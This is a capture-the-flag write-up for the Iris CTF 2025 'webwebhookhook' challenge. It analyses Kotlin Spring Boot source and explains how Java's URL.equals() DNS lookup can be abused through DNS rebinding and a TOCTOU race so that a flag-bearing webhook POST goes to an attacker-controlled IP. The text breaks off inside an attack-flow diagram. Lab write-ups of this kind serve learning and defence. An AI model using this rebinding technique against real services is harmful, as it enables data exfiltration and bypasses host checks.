revalidation</a></li></ul></li><li><a href=#exploitation-cry-and-pray>Exploitation (cry and pray)</a></li><li><a href=#extra>Extra</a><ul><li><a href=#but-why-the-hell-does-java-do-dns-resolutions-on-simple--comparisons>But why the hell does Java do DNS resolutions on simple <code>==</code> comparisons?</a></li></ul></li></ul></nav></div></details><details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden"><summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#description>Description</a></li><li><a href=#source-code-analysis>Source code analysis</a></li><li><a href=#vulnerability-discovery>Vulnerability discovery</a><ul><li><a href=#doomscrolling-remembrance-of-a-random-tweet-to-win>Doomscrolling remembrance of a random tweet to win</a></li><li><a href=#toctou-race--dns-cache-revalidation>TOCTOU race + DNS cache revalidation</a></li></ul></li><li><a href=#exploitation-cry-and-pray>Exploitation (cry and pray)</a></li><li><a href=#extra>Extra</a><ul><li><a href=#but-why-the-hell-does-java-do-dns-resolutions-on-simple--comparisons>But why the hell does Java do DNS resolutions on simple <code>==</code> comparisons?</a></li></ul></li></ul></nav></div></details><script>var margin=200,marginError=50;(function(){var t=$(window),e=$("#TOCView"),s=e.height();function n(){var n=t.height()-margin;s>=n?(e.css("overflow-y","scroll"),e.css("max-height",n+marginError+"px")):(e.css("overflow-y","hidden"),e.css("max-height","9999999px"))}t.on("resize",n),$(document).ready(n)})(),function(){var t,e=$("#TableOfContents");if(e.length>0){t=$(window);function n(){var s,o=t.scrollTop(),i=$(".anchor"),n="";if(i.each(function(e,t){t=$(t),t.offset().top-$(window).height()/3<=o&&(n=decodeURIComponent(t.attr("id")))}),s=e.find("a.active"),s.length==1&&s.eq(0).attr("href")=="#"+n)return!0;s.each(function(e,t){$(t).removeClass("active")}),e.find('a[href="#'+n+'"]').addClass("active"),e.find('a[href="#'+n+'"]').parentsUntil("#TableOfContents").each(function(e,t){$(t).children("a").parents("ul").show()})}t.on("scroll",n),$(document).ready(function(){n()})}}()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentcolor" d="M159.3 5.4c7.8-7.3 19.9-7.2 27.7.1 27.6 25.9 53.5 53.8 77.7 84 11-14.4 23.5-30.1 37-42.9 7.9-7.4 20.1-7.4 28 .1 34.6 33 63.9 76.6 84.5 118 20.3 40.8 33.8 82.5 33.8 111.9C448 404.2 348.2 512 224 512 98.4 512 0 404.1.0 276.5c0-38.4 17.8-85.3 45.4-131.7C73.3 97.7 112.7 48.6 159.3 5.4zM225.7 416c25.3.0 47.7-7 68.8-21 42.1-29.4 53.4-88.2 28.1-134.4-2.8-5.6-5.6-11.2-9.8-16.8l-50.6 58.8S180.8 199 175.1 192c-42 51.8-63.1 81.2-63.1 114.8C112 375.4 162.6 416 225.7 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Update</strong>:<br>This writeup was selected as one of the winners of the Iris CTF 2025 writeup competition &ndash;> <a href=https://discord.com/channels/1051808836593397781/1051815606732738590/1333226270699294800 target=_blank>https://discord.com/channels/1051808836593397781/1051815606732738590/1333226270699294800</a></span></div><h2 class="relative group">TL;DR<div id=tldr class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#tldr aria-label=Anchor>#</a></span></h2><p>The challenge consisted in exploiting a <strong>TOCTOU</strong> race condition by using <strong>DNS rebinding</strong> to bypass <code>URL.equals()</code> check in Java.</p><h2 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#description aria-label=Anchor>#</a></span></h2><blockquote><p>I made a service to convert webhooks into webhooks.</p></blockquote><h2 class="relative group">Source code analysis<div id=source-code-analysis class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#source-code-analysis aria-label=Anchor>#</a></span></h2><p>Upon extracting the challenge attachments, it will present itself as a Kotlin-based Spring Boot application with very minimal code.<br>In fact the only relevant files to us are <code>WebwebhookhookApplication.kt</code>, <code>State.kt</code> and <code>controller/MainController.kt</code>.</p><p><strong>State.kt</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-kotlin data-lang=kotlin><span class=line><span class=ln> 1</span><span class=cl><span class=k>package</span> <span class=nn>tf.irisc.chal.webwebhookhook</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>
</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=k>import</span> <span class=nn>java.net.URI</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=k>import</span> <span class=nn>java.net.URL</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=k>class</span> <span class=nc>StateType</span><span class=p>(</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl>        <span class=n>hook</span><span class=p>:</span> <span class=n>String</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>        <span class=k>var</span> <span class=py>template</span><span class=p>:</span> <span class=n>String</span><span class=p>,</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl>        <span class=k>var</span> <span class=py>response</span><span class=p>:</span> <span class=n>String</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>        <span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>    <span class=k>var</span> <span class=py>hook</span><span class=p>:</span> <span class=n>URL</span> <span class=p>=</span> <span class=nc>URI</span><span class=p>.</span><span class=n>create</span><span class=p>(</span><span class=n>hook</span><span class=p>).</span><span class=n>toURL</span><span class=p>()</span>
</span></span><span class=line><span class=ln>12</span><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>
</span></span><span class=line><span class=ln>14</span><span class=cl><span class=k>object</span> <span class=nc>State</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=k>var</span> <span class=py>arr</span> <span class=p>=</span> <span class=n>ArrayList</span><span class=p>&lt;</span><span class=n>StateType</span><span class=p>&gt;()</span>
</span></span><span class=line><span class=ln>16</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The <code>StateType</code> class is being defined to store an <code>hook</code> URL, a mutable <code>template</code> string and a mutable <code>response</code> string. Note that in the constructor, the <code>hook</code> declaration is being shadowed by <code>var hook: URL = URI.create(hook).toURL()</code>, meaning that it will accept hook parameter as string but it&rsquo;ll be casted as an <code>URL</code> object immediately.<br>The <code>StateType</code> class is later used as Collection argument for <code>ArrayList</code> stored inside <code>State.arr</code>.<br>The <code>State</code> object is defined as singleton, meaning there is exactly one instance of <code>State</code> in the entire application.<br>This pattern effectively gives the application a simple in-memory database of all registered hooks and their associated templates.</p><p><strong>WebwebhookhookApplication.kt</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-kotlin data-lang=kotlin><span class=line><span class=ln> 1</span><span class=cl><span class=k>package</span> <span class=nn>tf.irisc.chal.webwebhookhook</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>
</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.boot.autoconfigure.SpringBootApplication</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.boot.runApplication</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=nd>@SpringBootApplication</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=k>class</span> <span class=nc>WebwebhookhookApplication</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=k>const</span> <span class=k>val</span> <span class=py>FLAG</span> <span class=p>=</span> <span class=s2>&#34;irisctf{test_flag}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>10</span><span class=cl>
</span></span><span class=line><span class=ln>11</span><span class=cl><span class=k>fun</span> <span class=nf>main</span><span class=p>(</span><span class=n>args</span><span class=p>:</span> <span class=n>Array</span><span class=p>&lt;</span><span class=n>String</span><span class=p>&gt;)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>12</span><span class=cl>    <span class=nc>State</span><span class=p>.</span><span class=n>arr</span><span class=p>.</span><span class=n>add</span><span class=p>(</span><span class=n>StateType</span><span class=p>(</span>
</span></span><span class=line><span class=ln>13</span><span class=cl>            <span class=s2>&#34;http://example.com/admin&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>            <span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>data</span><span class=se>\&#34;</span><span class=s2>: _DATA_, </span><span class=se>\&#34;</span><span class=s2>flag</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>&#34;</span> <span class=p>+</span> <span class=n>FLAG</span> <span class=p>+</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>}&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=ln>15</span><span class=cl>            <span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>response</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>ok</span><span class=se>\&#34;</span><span class=s2>}&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=n>runApplication</span><span class=p>&lt;</span><span class=n>WebwebhookhookApplication</span><span class=p>&gt;(*</span><span class=n>args</span><span class=p>)</span>
</span></span><span class=line><span class=ln>17</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This is the main entry point for the application. Here an entry is being added in the global <code>State</code> object, using:</p><ul><li><code>http://example.com/admin</code> as value for the <code>hook</code> parameter.</li><li><code>{"data": _DATA_, "flag": "irisctf{test_flag}"}</code> as value for the <code>template</code> string.</li><li><code>{"response": "ok"}</code> as value for the <code>response</code> string.</li></ul><p>Let&rsquo;s analyze the application further to understand how we might be able to read that flag.</p><p><strong>controller/MainController.kt</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-kotlin data-lang=kotlin><span class=line><span class=ln> 1</span><span class=cl><span class=k>package</span> <span class=nn>tf.irisc.chal.webwebhookhook.controller</span>
</span></span><span class=line><span class=ln> 2</span><span class=cl>
</span></span><span class=line><span class=ln> 3</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.http.MediaType</span>
</span></span><span class=line><span class=ln> 4</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.stereotype.Controller</span>
</span></span><span class=line><span class=ln> 5</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.ui.Model</span>
</span></span><span class=line><span class=ln> 6</span><span class=cl><span class=k>import</span> <span class=nn>org.springframework.web.bind.annotation.*</span>
</span></span><span class=line><span class=ln> 7</span><span class=cl><span class=k>import</span> <span class=nn>tf.irisc.chal.webwebhookhook.State</span>
</span></span><span class=line><span class=ln> 8</span><span class=cl><span class=k>import</span> <span class=nn>tf.irisc.chal.webwebhookhook.StateType</span>
</span></span><span class=line><span class=ln> 9</span><span class=cl><span class=k>import</span> <span class=nn>java.net.HttpURLConnection</span>
</span></span><span class=line><span class=ln>10</span><span class=cl><span class=k>import</span> <span class=nn>java.net.URI</span>
</span></span><span class=line><span class=ln>11</span><span class=cl>
</span></span><span class=line><span class=ln>12</span><span class=cl><span class=nd>@Controller</span>
</span></span><span class=line><span class=ln>13</span><span class=cl><span class=k>class</span> <span class=nc>MainController</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>14</span><span class=cl>
</span></span><span class=line><span class=ln>15</span><span class=cl>    <span class=nd>@GetMapping</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=ln>16</span><span class=cl>    <span class=k>fun</span> <span class=nf>home</span><span class=p>(</span><span class=n>model</span><span class=p>:</span> <span class=n>Model</span><span class=p>):</span> <span class=n>String</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>17</span><span class=cl>        <span class=k>return</span> <span class=s2>&#34;home.html&#34;</span>
</span></span><span class=line><span class=ln>18</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>19</span><span class=cl>
</span></span><span class=line><span class=ln>20</span><span class=cl>    <span class=nd>@PostMapping</span><span class=p>(</span><span class=s2>&#34;/webhook&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=ln>21</span><span class=cl>    <span class=nd>@ResponseBody</span>
</span></span><span class=line><span class=ln>22</span><span class=cl>    <span class=k>fun</span> <span class=nf>webhook</span><span class=p>(</span><span class=nd>@RequestParam</span><span class=p>(</span><span class=s2>&#34;hook&#34;</span><span class=p>)</span> <span class=n>hook_str</span><span class=p>:</span> <span class=n>String</span><span class=p>,</span> <span class=nd>@RequestBody</span> <span class=n>body</span><span class=p>:</span> <span class=n>String</span><span class=p>,</span> <span class=nd>@RequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>)</span> <span class=n>contentType</span><span class=p>:</span> <span class=n>String</span><span class=p>,</span> <span class=n>model</span><span class=p>:</span> <span class=n>Model</span><span class=p>):</span> <span class=n>String</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>23</span><span class=cl>        <span class=k>var</span> <span class=py>hook</span> <span class=p>=</span> <span class=nc>URI</span><span class=p>.</span><span class=n>create</span><span class=p>(</span><span class=n>hook_str</span><span class=p>).</span><span class=n>toURL</span><span class=p>();</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=n>h</span> <span class=k>in</span> <span class=nc>State</span><span class=p>.</span><span class=n>arr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>h</span><span class=p>.</span><span class=n>hook</span> <span class=o>==</span> <span class=n>hook</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>26</span><span class=cl>                <span class=k>var</span> <span class=py>newBody</span> <span class=p>=</span> <span class=n>h</span><span class=p>.</span><span class=n>template</span><span class=p>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;_DATA_&#34;</span><span class=p>,</span> <span class=n>body</span><span class=p>);</span>
</span></span><span class=line><span class=ln>27</span><span class=cl>                <span class=k>var</span> <span class=py>conn</span> <span class=p>=</span> <span class=n>hook</span><span class=p>.</span><span class=n>openConnection</span><span class=p>()</span> <span class=k>as</span><span class=p>?</span> <span class=n>HttpURLConnection</span><span class=p>;</span>
</span></span><span class=line><span class=ln>28</span><span class=cl>                <span class=k>if</span><span class=p>(</span><span class=n>conn</span> <span class=o>===</span> <span class=k>null</span><span class=p>)</span> <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=ln>29</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>requestMethod</span> <span class=p>=</span> <span class=s2>&#34;POST&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=ln>30</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>doOutput</span> <span class=p>=</span> <span class=k>true</span><span class=p>;</span>
</span></span><span class=line><span class=ln>31</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>setFixedLengthStreamingMode</span><span class=p>(</span><span class=n>newBody</span><span class=p>.</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=ln>32</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>setRequestProperty</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=n>contentType</span><span class=p>);</span>
</span></span><span class=line><span class=ln>33</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=ln>34</span><span class=cl>                <span class=n>conn</span><span class=p>.</span><span class=n>outputStream</span><span class=p>.</span><span class=n>use</span> <span class=p>{</span> <span class=n>os</span> <span class=o>-&gt;</span>
</span></span><span class=line><span class=ln>35</span><span class=cl>                    <span class=n>os</span><span class=p>.</span><span class=n>write</span><span class=p>(</span><span class=n>newBody</span><span class=p>.</span><span class=n>toByteArray</span><span class=p>())</span>
</span></span><span class=line><span class=ln>36</span><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=ln>37</span><span class=cl>
</span></span><span class=line><span class=ln>38</span><span class=cl>                <span class=k>return</span> <span class=n>h</span><span class=p>.</span><span class=n>response</span>
</span></span><span class=line><span class=ln>39</span><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=ln>40</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>41</span><span class=cl>        <span class=k>return</span> <span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>result</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>fail</span><span class=se>\&#34;</span><span class=s2>}&#34;</span>
</span></span><span class=line><span class=ln>42</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>43</span><span class=cl>
</span></span><span class=line><span class=ln>44</span><span class=cl>    <span class=nd>@PostMapping</span><span class=p>(</span><span class=s2>&#34;/create&#34;</span><span class=p>,</span> <span class=n>consumes</span> <span class=p>=</span> <span class=p>[</span><span class=nc>MediaType</span><span class=p>.</span><span class=n>APPLICATION_JSON_VALUE</span><span class=p>])</span>
</span></span><span class=line><span class=ln>45</span><span class=cl>    <span class=nd>@ResponseBody</span>
</span></span><span class=line><span class=ln>46</span><span class=cl>    <span class=k>fun</span> <span class=nf>create</span><span class=p>(</span><span class=nd>@RequestBody</span> <span class=n>body</span><span class=p>:</span> <span class=n>StateType</span><span class=p>):</span> <span class=n>String</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>47</span><span class=cl>        <span class=k>for</span><span class=p>(</span><span class=n>h</span> <span class=k>in</span> <span class=nc>State</span><span class=p>.</span><span class=n>arr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>48</span><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=n>body</span><span class=p>.</span><span class=n>hook</span> <span class=o>==</span> <span class=n>h</span><span class=p>.</span><span class=n>hook</span><span class=p>)</span>
</span></span><span class=line><span class=ln>49</span><span class=cl>                <span class=k>return</span> <span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>result</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>fail</span><span class=se>\&#34;</span><span class=s2>}&#34;</span>
</span></span><span class=line><span class=ln>50</span><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=ln>51</span><span class=cl>        <span class=nc>State</span><span class=p>.</span><span class=n>arr</span><span class=p>.</span><span class=n>add</span><span class=p>(</span><span class=n>body</span><span class=p>)</span>
</span></span><span class=line><span class=ln>52</span><span class=cl>        <span class=k>return</span> <span class=s2>&#34;{</span><span class=se>\&#34;</span><span class=s2>result</span><span class=se>\&#34;</span><span class=s2>: </span><span class=se>\&#34;</span><span class=s2>ok</span><span class=se>\&#34;</span><span class=s2>}&#34;</span>
</span></span><span class=line><span class=ln>53</span><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=ln>54</span><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The router for the Spring Boot Application is configured to have the <code>/create</code> and the <code>/webhook</code> endpoints.</p><ol><li>The <code>/create</code> endpoint accepts <code>POST</code> requests with <code>application/json</code> body that will be casted as <code>StateType</code>. Then it checks if an entry with same hook is already occurring in the global <code>State</code> object, and if so, it will return a json response of <code>{"result": "fail"}</code>. After iterating the <code>ArrayList</code>, if no matching instances were found, a new <code>StateType</code> entry will be appended.<br>Essentially, this endpoint registers a new webhook configuration, unless it already exists.</li><li>The <code>/webhook</code> endpoint will accept <code>POST</code> requests with a <code>hook</code> parameter. It will iterate over the <code>State.arr</code> global list of previously created webhook configurations, and if it finds a matching <code>hook</code> URL, it will replace the <code>_DATA_</code> placeholder in the template with the content of the supplied body, and send a POST request to the given <code>hook</code> URL using <code>HttpURLConnection</code> with the new body. If the <code>hook</code> URL is not found in the <code>State.arr</code>, it will return a json response of <code>{"result": "fail"}</code>.</li></ol><div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"><span class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentcolor" d="M506.3 417 293 53c-16.33-28-57.54-28-73.98.0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6c32.76.0 53.26-35 36.96-63zM232 168c0-13.25 10.75-24 24-24s24 10.8 24 24v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zm24 248c-17.36.0-31.44-14.08-31.44-31.44s14.07-31.44 31.44-31.44 31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
</span></span><span class=dark:text-neutral-300><strong>Note</strong><br>Both endpoints do not provide SSRF protections, however it&rsquo;s irrelevant for us as there are no additional services running on the server.</span></div><h2 class="relative group">Vulnerability discovery<div id=vulnerability-discovery class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#vulnerability-discovery aria-label=Anchor>#</a></span></h2><p>At first glance, there doesn&rsquo;t seem to be an obvious way to intercept the flag, since the only way would be to successfully match the hook check and send the <code>POST</code> to <code>example.org</code>, which would be ez game if we were the admins of domain, which is not the case :P<br>One of my first steps was to try an HTTP smuggling, given the arbitrary control over the body that then replaces the content of <code>_DATA_</code>, to build a request like this:</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/h2_attempt.png alt="Smuggling attempt on body content."><figcaption>Smuggling attempt on body content.</figcaption></figure></p><p>However, we note how the body of the request is correctly set based on the length of our payload at <strong>L31</strong> with <code>conn.setFixedLengthStreamingMode(newBody.length)</code> consequently failing to delimit the stream of the request to build a new one. Furthermore, it is not possible to override the request headers and in any case it would be a matter of exploiting a Spring Boot HTTP desync but today will not be the day of 0-days :/</p><p>Finally, in a scenario of arbitrary write in the system we could have tried to overwrite <code>/etc/hosts</code> file to override the DNS resolution of <code>example.org</code> and make it point to an IP under our control, but again, this is not the case for the challenge.</p><h3 class="relative group">Doomscrolling remembrance of a random tweet to win<div id=doomscrolling-remembrance-of-a-random-tweet-to-win class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#doomscrolling-remembrance-of-a-random-tweet-to-win aria-label=Anchor>#</a></span></h3><p>At that point I was pretty lost, the code was really minimal and I had to somehow pull off a complete domain check bypass from a bunch of URL comparisons&mldr;</p><blockquote><p>Wait did I say &ldquo;domain check bypass&rdquo; and &ldquo;url comparison&rdquo; !?</p></blockquote><p>That&rsquo;s exactly what I said to myself while overthinking the challenge and immediately after I had the remembrance of a (quite strange) Java behavior that I barely read about in a random tweet months ago while doomscrolling on X, which pointed out how comparing two <code>URL</code> objects in Java triggers a DNS resolution üíÄ</p><blockquote class=twitter-tweet><p lang=en dir=ltr>Your brain on Java is when comparing two strings REQUIRES A DNS LOOKUP <a href=https://t.co/VYzNBFri5b>pic.twitter.com/VYzNBFri5b</a></p>&mdash; Dmitrii Kovanikov (@ChShersh) <a href="https://twitter.com/ChShersh/status/1832688521762496747?ref_src=twsrc%5Etfw">September 8, 2024</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p><strong>More of that is discussed at the end of the writeup <a href=#extra>here</a>.</strong></p><p>At this point this enlightenment gave me a clear path to the resolution using <strong>DNS rebinding</strong>:</p><ul><li><ol><li>submit to <code>/endpoint</code> a domain like <code>rbndr.us</code> that resolves to the IP of <code>example.com</code>.</li></ol></li><li><ol start=2><li><code>URL.equals()</code> will trigger a DNS resolution on <code>rbndr.us</code> that will make succeed the check against <code>example.com</code>.</li></ol></li><li><ol start=3><li>make the <code>rbndr.us</code> domain resolve to different IP under our control.</li></ol></li><li><ol start=4><li>the <code>POST</code> request will be sent to the IP under our control, with the template body containing the flag.</li></ol></li></ul><p>Yep. That&rsquo;s it. Simple as that right?<br>ü•≤<br>No. ü•≤</p><p>Well, kinda, in theory (and in practice) that would work, I confirmed that the DNS resolution was made on the provided domain and by using a DNS rebinding service like <code>rbndr.us</code> I was able to get different response status codes from the server (because different domains were resolved each time).<br>This behavior was caused by the under the hood work of <a href=https://github.com/taviso/rbndr target=_blank>rbndr</a>, which as explained on their repo, all it does is simply provide a domain that resolves to IP <strong>A</strong> with a very low TTL, and then immediately switches the DNS resolution to IP <strong>B</strong> so that when a new DNS query is made to the same domain the second time it&rsquo;ll point a different IP address.<br>All of that is the basics of how a DNS rebinding attack works, which you can read more about <a href="https://github.com/taviso/rbndr?tab=readme-ov-file#rbndr" target=_blank>here</a>.</p><p>The main hurdle however was not to make DNS rebinding work, but to leverage DNS rebinding to cause a <strong>Time-of-check to time-of-use (TOCTOU) type race</strong> when:<br><strong>1)</strong> the domain DNS resolves to <code>example.org</code> IP to make the <code>URL.equals()</code> succeed<br>and<br><strong>2)</strong> the server opens a connection against my domain (causing a new DNS resolution) to send the request with the flag.</p><h3 class="relative group">TOCTOU race + DNS cache revalidation<div id=toctou-race--dns-cache-revalidation class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#toctou-race--dns-cache-revalidation aria-label=Anchor>#</a></span></h3><p>Unfortunately for my sanity, as we can see from the code between <strong>L23</strong> and <strong>L25</strong>, trying to exploit such a window between the check and the socket connection, meant finding a precision of a matter of milliseconds.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-kotlin data-lang=kotlin><span class=line><span class=ln>23</span><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>h</span><span class=p>.</span><span class=n>hook</span> <span class=o>==</span> <span class=n>hook</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=ln>24</span><span class=cl>    <span class=k>var</span> <span class=py>newBody</span> <span class=p>=</span> <span class=n>h</span><span class=p>.</span><span class=n>template</span><span class=p>.</span><span class=n>replace</span><span class=p>(</span><span class=s2>&#34;_DATA_&#34;</span><span class=p>,</span> <span class=n>body</span><span class=p>);</span>
</span></span><span class=line><span class=ln>25</span><span class=cl>    <span class=k>var</span> <span class=py>conn</span> <span class=p>=</span> <span class=n>hook</span><span class=p>.</span><span class=n>openConnection</span><span class=p>()</span> <span class=k>as</span><span class=p>?</span> <span class=n>HttpURLConnection</span><span class=p>;</span>
</span></span></code></pre></div><p>Moreover, Java&rsquo;s built-in DNS cache mechanism made things even more complicated.<br>While testing my basic DNS rebinding primitive, I noticed that I was getting the same status code in response to the <code>/webhook</code> endpoint for a period of 30 seconds. This sounded a bit strange to me since my DNS server was configured to reply with a 1 second TTL. In fact, what I did was a quick sanity check using both curl and python, and from both these clients the response to my rebinder domain kept changing every second:</p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/dns_python_test.png alt="DNS test"><figcaption>Python DNS test: caching NOT enabled</figcaption></figure></p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/dns_java_test.png alt="DNS test"><figcaption>Java DNS test: caching enabled</figcaption></figure></p><p><figure><img class="my-0 rounded-md" loading=lazy src=./img/foggia.png alt='"idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i&rsquo;m dossing example.org üíÄ"'><figcaption><em>"idk if java is doing some weird caching, python and curl behave differently. Trying multithread. I think i&rsquo;m dossing example.org"</em> üíÄ</figcaption></figure></p><p>Clearly some caching was at work in the Java side. It turns out that Java caches a DNS resolution for 30 seconds, which meant that we wanted to get our timing right when sending payload to the <code>/webhook</code> endpoint, so that <strong>the cache would be fetched at the time of comparison against example.org, to be invalidated immediately afterwards, thus requiring a cache revalidation at the time of the socket connection to send the flag to a domain under our control.</strong><br>Below I&rsquo;ve illustrated the attack workflow.</p><div style=background-color:#fff;padding:20px><div class=mermaid align=center>sequenceDiagram
title DNS Rebinding attack flow on Java `URL.equals()`
participant Attacker as Attacker
participant ChallengeServer as Challenge Server
participant AttackerServer as Attacker Rebinder Service (xxxx.rbndr.us)
participant DNS as Attacker DNS Server
Attacker->>ChallengeServer: POST /endpoint<br>?hook=xxxx.rbndr.us
note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
note over DNS: DNS A Record is 93.184.215.14, TTL=1 (example.org IP)
note over DNS: DNS A Record is 83.130.170.16, TTL=1 (attacker IP)
note over DNS: ...
